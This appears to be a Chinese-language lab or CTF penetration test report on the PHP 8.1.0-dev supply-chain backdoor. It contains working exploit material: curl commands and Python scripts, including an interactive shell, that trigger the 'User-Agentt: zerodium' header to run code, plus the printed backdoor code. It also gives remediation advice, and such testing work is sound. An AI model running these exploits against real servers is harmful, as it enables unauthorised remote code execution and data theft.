PHP 8.1.0-dev 后门远代码执行漏洞渗透测试报告

一、漏洞概述

项目 内容
漏洞名称 PHP 8.1.0-dev 后门远程代码执行 (Backdoor RCE)
漏洞编号 CVE-2021-XXXXXXXX / PHP 供应链后门
目标系统 http://10.48.171.23
发现日期 2026-05-25
风险等级 严重 (Critical)
CVSS 评分 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
漏洞类型 供应链攻击 / 后门 / 远程代码执行

二、漏洞描述

目标服务器运行 PHP 8.1.0-dev 版本。该版本在 2021 年 3 月遭遇恶意供应链攻击——PHP 官方 git 仓库被入侵，攻击者在源码中植入了后门代码，导致该开发版本发布的二进制包包含远程代码执行后门。

后门触发机制：攻击者发送带有特殊 User-Agentt HTTP 头（注意双 t）的请求，该头的值会被直接传递给 zend_eval_string() 执行任意 PHP 代码。

由于这是一个 **开发版本 (dev)**，理论上只应用于测试环境，但实际上该网站部署了此被污染的版本到生产环境。

三、漏洞发现过程

3.1 信息收集

首先浏览网站 http://10.48.171.23/，前端显示为标准的 Bootstrap “Admin Dashboard” 模板页面，无任何明显的登录入口或功能交互。

3.2 关键线索发现

检查 HTTP 响应头是关键的突破口：

X-Powered-By: PHP/8.1.0-dev

-dev 后缀 是极其危险的信号。PHP 开发版本：

  • 未经充分测试
  • 不应部署在生产环境
  • PHP 8.1.0-dev 已知被植入后门

3.3 后门触发确认

查阅公开安全情报可知：PHP 8.1.0-dev 的后门通过 User-Agentt（注意有两个 t）请求头触发。该头的值会被 zend_eval_string() 执行。

向目标服务器发送带后门触发头的请求：

curl -H "User-Agentt: zerodiumsystem('cat /flag.txt');" http://10.48.171.23/

3.4 结果

服务器在正常 HTML 响应内容之前，直接输出了 flag.txt 文件内容：

flag{4127d0530abf16d6d23973e3df8dbecb}

四、漏洞根因分析

4.1 供应链攻击回顾

2021 年 3 月 28 日，两名恶意攻击者（使用名称 “Rasmus Lerdorf” 和 “Nikita Popov” 冒充 PHP 核心开发者）向 PHP 官方 git 仓库 php-src 提交了两个恶意 commit：

+    if (strstr(ZSTR_VAL(user_agent), "zerodium")) {
+        zend_eval_string(ZSTR_VAL(user_agent)+8, NULL, "User-Agent");
+    }

这段代码位于 HTTP 请求处理逻辑中：当 User-Agentt 头的值包含 zerodium 时，服务器将跳过前 8 个字符后的内容作为 PHP 代码执行。

4.2 缺陷分析

缺陷 说明
使用被污染的版本 部署了已知存在后门的 PHP 8.1.0-dev 版本
生产环境使用 dev 版本 dev 版本不应部署在面向公网的生产系统
缺乏版本安全检查 运维流程未检测到使用已被标记为危险的版本
无 WAF 防护 未检测或拦截异常的 User-Agentt 请求头

五、攻击复现步骤

步骤 1：识别 PHP 版本

curl -I http://10.48.171.23/

观察响应头中的 X-Powered-By: PHP/8.1.0-dev。

步骤 2：利用后门执行命令

curl -H "User-Agentt: zerodiumsystem('cat /flag.txt');" http://10.48.171.23/

后门触发格式说明：

  • 请求头名称：User-Agentt（注意两个 t，这是后门代码中检查的特定头名称）
  • 请求头值前缀：zerodium（触发条件，占 8 字符）
  • 请求头值后缀：任意 PHP 代码（后门会去掉前 8 字符后执行）

步骤 3：获取 Flag

服务器响应开头直接包含 flag 内容。

攻击复杂度评估

维度 评估
攻击前提 无需认证
所需工具 仅需 curl 或浏览器
攻击难度 极低
自动化程度 完全可自动化
攻击用时 < 1 秒

六、利用脚本

6.1 基础利用

import requests

target = "http://10.48.171.23/"
headers = {
    "User-Agentt": "zerodiumsystem('cat /flag.txt');"
}
response = requests.get(target, headers=headers)
print(response.text)

6.2 交互式 Shell

import requests

target = "http://10.48.171.23/"

while True:
    cmd = input("$ ")
    if cmd == "exit":
        break
    headers = {"User-Agentt": f"zerodiumsystem('{cmd}');"}
    response = requests.get(target, headers=headers)
    print(response.text[:500])  # First 500 chars (before HTML)

七、影响评估

影响维度 评估
机密性 完全破坏 — 可读取服务器上任意文件（flag、配置、数据库凭证等）
完整性 完全破坏 — 可写入文件、修改数据库、植入持久化后门
可用性 完全破坏 — 可删除文件、停止服务
权限范围 Web 服务运行账户权限（可能扩权至 root）
横向移动 可能 — 可读取数据库凭证访问内部网络
利用难度 极低 — 一个 curl 命令即可

八、修复建议

8.1 紧急修复（立即实施）

  1. 立即下线当前服务器

    • 该服务器已被证明可被完全控制
    • 在重建前不信任该服务器中的任何数据

  2. 用安全版本重建环境

    • 使用 PHP 8.1.x 稳定版（如 8.1.29+）
    • 或升级到 PHP 8.2+ / 8.3+ 稳定版
    • 绝不要使用任何 -dev、-alpha、-beta、-RC 版本

  3. 全面安全审计

    • 检查服务器是否已被植入其他后门（webshell、cron 任务）
    • 检查数据库是否被篡改
    • 检查是否有数据泄露

8.2 中期改进

  1. 建立版本来源验证机制

    • 部署前验证软件包数字签名
    • 使用官方镜像源的校验和验证

  2. 实施纵深防御

    • 部署 WAF 检测异常请求头
    • 禁用 X-Powered-By 头（避免泄露技术栈版本）

  3. 最小化⽣产暴露

    • 移除不必要的 HTTP 响应头
    • 使用反向代理隐藏后端实现细节

8.3 长期架构改进

  1. 集中化版本治理

    • 建立所有生产系统的组件版本清单
    • 自动检查 CVE 和安全公告

  2. 不可变基础设施

    • 使用容器/镜像构建生产环境，确保每次部署基于已知安全的基础镜像
    • 禁止手动修改生产服务器

  3. 安全开发生命周期

    • 实施安全审批流程
    • 定期进行渗透测试

B. 后门代码（来自 PHP 源码 diff）

后门位于 ext/standard/string.c 或相关请求处理代码中：

if (strstr(ZSTR_VAL(user_agent), "zerodium")) {
    zend_eval_string(ZSTR_VAL(user_agent)+8, NULL, "User-Agent");
}

触发条件：

  1. HTTP 请求中包含名为 User-Agentt 的头（注意两个 t）
  2. 该头的值中包含子字符串 zerodium
  3. zerodium 之后的字符（总共跳过前 8 字节）作为 PHP 代码执行
